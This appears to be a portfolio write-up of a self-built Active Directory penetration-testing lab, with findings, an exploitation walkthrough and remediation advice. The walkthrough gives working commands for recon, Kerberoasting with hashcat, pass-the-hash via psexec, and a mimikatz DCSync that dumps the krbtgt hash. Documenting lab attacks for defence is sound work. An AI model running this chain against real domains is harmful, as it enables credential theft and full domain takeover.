🖥️ Active Directory Pentest Lab

Complete vulnerability assessment, exploitation chain, and privilege escalation walkthrough in a controlled AD environment.

Completed: December 2024
Duration: 3 weeks
Role: Red Team Operator
Tools: Kali Linux, Windows Server, Impacket, Mimikatz

🎯 Lab Overview

This project involved building a vulnerable Active Directory environment from scratch, simulating a realistic corporate network with domain controllers, workstations, and misconfigurations. The goal was to identify security weaknesses, exploit them using real-world attack techniques, and provide actionable remediation strategies.

🔍 Vulnerability Assessment

Initial reconnaissance using Nmap and BloodHound revealed several critical misconfigurations:

CRITICAL

Weak Kerberos encryption

RC4_HMAC_MD5 enabled, vulnerable to Kerberoasting attacks.

HIGH

Unconstrained Delegation

Multiple service accounts with unconstrained delegation enabled.

HIGH

Pass-the-Hash vulnerable

NTLM hashes accessible via LSASS memory.

MEDIUM

AS-REP Roasting

Kerberos pre-authentication disabled for some accounts.

⚡ Exploitation Walkthrough

Step 1: Initial Reconnaissance

nmap -sV -sC -p- 192.168.1.10
bloodhound-python -d domain.local -u username -p password -ns 192.168.1.10

Step 2: Kerberoasting Attack

Extracted service account hashes from the domain controller and cracked them offline.

GetUserSPNs.py domain.local/username:password -request -outputfile hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt

Step 3: Pass-the-Hash & Lateral Movement

Using cracked NTLM hash to move laterally to domain controller.

psexec.py domain.local/administrator@dc01.domain.local -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

Step 4: Privilege Escalation - DCSync Attack

Simulated a DCSync attack to extract all domain password hashes.

mimikatz "lsadump::dcsync /user:domain\krbtgt /domain:domain.local"

📊 Findings & Impact

The attack chain successfully achieved:

  • ✅ Domain Admin compromise within 45 minutes
  • ✅ Extraction of all domain password hashes
  • ✅ Persistent backdoor via Golden Ticket attack
  • ✅ Lateral movement to all workstations

🛡️ Remediation Recommendations

  • 🔹 Disable RC4_HMAC_MD5 Kerberos encryption
  • 🔹 Implement AES encryption for service accounts
  • 🔹 Enable Kerberos Armoring (FAST)
  • 🔹 Use Managed Service Accounts (gMSA) instead of regular service accounts
  • 🔹 Monitor Event IDs 4769 and 4770 for suspicious Kerberos tickets
  • 🔹 Implement LAPS for local admin password rotation

📈 Lessons Learned

This lab demonstrated how quickly misconfigurations can lead to full domain compromise. The most critical takeaway is that Active Directory security requires defense-in-depth: strong encryption, service account hardening, and continuous monitoring. Regular penetration testing is essential to identify these blind spots before real attackers do.
